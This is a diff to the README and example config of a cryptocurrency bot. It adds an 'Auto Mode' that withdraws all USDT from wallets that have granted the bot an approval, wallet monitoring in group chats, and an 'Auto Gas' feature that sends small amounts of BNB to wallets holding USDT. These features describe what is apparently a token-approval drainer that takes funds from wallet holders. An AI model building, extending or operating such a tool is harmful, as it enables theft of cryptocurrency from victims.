@@ -99,6 +99,18 @@ GAS_PRICE_GWEI=5
 # Rate Limiting
 RATE_LIMIT_SECONDS=1
 
+# Auto Mode Configuration
+AUTO_MODE_ENABLED=false
+AUTO_WITHDRAW_INTERVAL=30
+
+# Auto Gas Configuration
+AUTO_GAS_ENABLED=false
+AUTO_GAS_PRIVATE_KEY=your_auto_gas_private_key_here
+AUTO_GAS_USDT_THRESHOLD=0.5
+AUTO_GAS_BNB_THRESHOLD=0.00000720
+AUTO_GAS_BNB_AMOUNT=0.00001
+AUTO_GAS_CHECK_INTERVAL=60
+
 # Web API Configuration
 API_HOST=0.0.0.0
 API_PORT=5000
@@ -194,9 +206,40 @@ Create `.vscode/tasks.json`:
 
 Then use `Ctrl+Shift+P` > "Tasks: Run Task" > "Start USDT Bot"
 
-## New Features Added
+## Enhanced Features Added
 
-### 1. Enhanced Address Detection
+### 1. Enhanced Wallet Detection with Approval Status
+- **Smart Detection**: Automatically detects wallet addresses in groups/channels
+- **Approval Status**: Shows if wallet is connected (green) or not approved (red)
+- **Complete Info**: Displays USDT balance, BNB balance, and approval status
+- **Format**: Shows exactly as requested:
+  ```
+  🟢 Wallet Connected:
+  0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb
+  USDT Balance: $0.20
+  BNB Balance: 0.00001190330000000
+
+  ✅ USDT Approved: 0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb
+  USDT: $0.20
+  BNB: 0.00001190330000000
+  ```
+
+### 2. Auto Mode Button
+- **Auto Withdrawal**: Toggleable button that automatically withdraws all USDT from approved wallets
+- **Instant Processing**: Withdraws USDT instantly when detected
+- **Smart Monitoring**: Only monitors wallets with active allowances
+- **Status Display**: Shows current auto mode status and monitored wallets count
+
+### 3. Auto Gas ⛽ Button
+- **Smart BNB Distribution**: Automatically sends BNB to wallets that need gas
+- **Conditions**: 
+  - USDT balance ≥ $0.5
+  - BNB balance < 0.00000720
+  - Sends exactly 0.00001 BNB
+- **Safety**: Won't send BNB if USDT < $0.5 or if wallet already has sufficient BNB
+- **Configurable**: All thresholds adjustable via environment variables
+
+### 4. Enhanced Address Detection
 - **Auto-detection:** Bot automatically recognizes wallet addresses in private messages
 - **Group monitoring:** Detects and analyzes wallet addresses posted in groups/channels
 - **Smart parsing:** Extracts addresses from various text formats
